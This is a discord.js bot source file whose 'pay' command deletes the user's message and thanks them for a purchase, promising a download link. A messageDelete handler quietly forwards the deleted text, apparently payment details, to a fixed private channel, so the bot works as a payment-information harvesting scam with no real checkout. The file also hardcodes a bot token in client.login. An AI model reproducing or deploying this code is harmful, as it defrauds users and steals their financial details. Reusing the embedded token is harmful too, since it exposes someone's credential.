const Discord = require("discord.js");
const client = new Discord.Client();
const { prefix, token } = require('./config.json');
const config = require('./config.json');

client.on("ready", () => {
  console.log("Systems Active!");
});

client.on('messageDelete', message => {
  client.channels.cache.get("737895602746294323").send(`Someone made a purchase with "${message}" at ${new Date()}`)
});

client.on("message", async message => {
    const args = message.content.slice(config.prefix.length).trim().split(/ +/g);
    const command = args.shift().toLowerCase();
    
    if(command === "pay") {
        message.delete().catch(O_o=>{});
        return message.author.send("Thank you for your purchase! Please allow up to 24 hours for your payment to be processed.\n \nAfter your payment method is processed and verified, you will receive a email with the download link!")
    }

    if(command === "purge") {
        const deleteCount = parseInt(args[0], 10);
        if(!deleteCount || deleteCount < 2 || deleteCount > 100)
          return message.reply("Please provide a number between 2 and 100 for the number of messages to delete");
        const fetched = await message.channel.messages.fetch({limit: deleteCount});
        message.channel.bulkDelete(fetched)
          .catch(error => message.reply(`Couldn't delete messages because of: ${error}`));
      }

      if(command === "say") {
          const sayMessage = args.join(" ");
          message.delete().catch(O_o=>{});
          message.channel.send(sayMessage);
      }

});

client.login("NzM3ODg2NTgzNTc4OTUxNjkw.XyD4bg.l7As2I1OwY3_N_JVnQkshl9TgbA");